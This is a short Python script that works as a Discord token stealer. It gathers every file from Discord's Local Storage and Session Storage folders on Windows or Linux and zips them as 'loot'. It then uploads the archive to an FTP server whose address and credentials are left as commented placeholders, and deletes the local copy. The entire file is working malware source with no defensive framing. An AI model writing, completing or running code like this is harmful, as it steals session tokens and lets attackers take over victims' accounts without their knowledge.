from random import random
from datetime import datetime
from ftplib import FTP
from zipfile import ZipFile
from getpass import getuser
import os.path
import platform

try:
    def get_all_file_paths(directory):
        # initializing empty file paths list
        file_paths = []

        # crawling through directory and subdirectories
        for root, directories, files in os.walk(directory):
            for filename in files:
                # join the two strings in order to form the full filepath.
                filepath = os.path.join(root, filename)
                file_paths.append(filepath)

                # returning all file paths
        return file_paths


    os_type = platform.system()
    time = datetime.now()
    username = getuser()
    salt = round(random() * 100000)
    zip_name = username + '_' + str(time.strftime("%d-%m-%y_%I-%M_")) + str(salt) + '.zip'
    usr_home = os.path.expanduser('~')

    if os_type == "Windows":
        print('Running on Windows system')
        discord_lstorage = usr_home + '\\AppData\\Roaming\\discord\\Local Storage\\'
        discord_sstorage = usr_home + '\\AppData\\Roaming\\discord\\Session Storage\\'
        archive_location = usr_home + '\\AppData\\Local\\Temp\\' + zip_name

    elif os_type == "Linux":
        print('Running on Linux system')
        discord_lstorage = usr_home + '/.config/discord/Local Storage/'
        discord_sstorage = usr_home + '/.config/discord/Session Storage'
        archive_location = '/tmp/' + zip_name

    loot_1 = get_all_file_paths(discord_lstorage)
    loot_2 = get_all_file_paths(discord_sstorage)

    with ZipFile(archive_location, 'w') as zip:
        # writing each file one by one
        for file in loot_1:
            zip.write(file)
        for file in loot_2:
            zip.write(file)

    # FTP
    ftp = FTP()
    ftp.set_debuglevel(2)
    #ftp.connect(<SERVER>, <PORT>)
    #ftp.login(<USER>, <PASSWORD>)
    #ftp.cwd(<REMOTE FTP DIRECTORY>)

    # Sending file on FTP server
    print(ftp.dir())
    fp = open(archive_location, 'rb')
    ftp.storbinary('STOR %s' % os.path.basename(zip_name), fp, 1024)
    fp.close()

    os.remove(archive_location)

except:
    print('Something went wrong!')